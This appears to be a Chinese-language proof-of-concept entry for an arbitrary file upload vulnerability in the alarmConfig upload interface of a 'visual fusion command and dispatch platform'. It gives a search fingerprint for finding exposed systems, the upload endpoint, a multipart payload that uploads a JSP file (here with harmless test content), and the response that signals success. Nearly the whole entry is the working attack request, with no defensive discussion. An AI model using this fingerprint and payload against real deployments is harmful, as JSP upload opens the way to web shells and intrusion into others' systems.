# 可视化融合指挥调度平台alarmConfig接口任意文件上传漏洞

可视化融合指挥调度平台alarmConfig接口 ｜ 文件上传 ｜ —
- **指纹**：`body="base/searchInfoWindow_min.cs`
- **请求**：`POST /dispatch/alarm/alarmConfig/upload HTTP/1.1`

**Payload**
```
------WebKitFormBoundary7ctER307B0RaQwOp
Content-Disposition: form-data; name="file";filename="dudesite.jsp"
123456
------WebKitFormBoundary7ctER307B0RaQwOp--
```
- **响应特征**：200 dudesite.jsp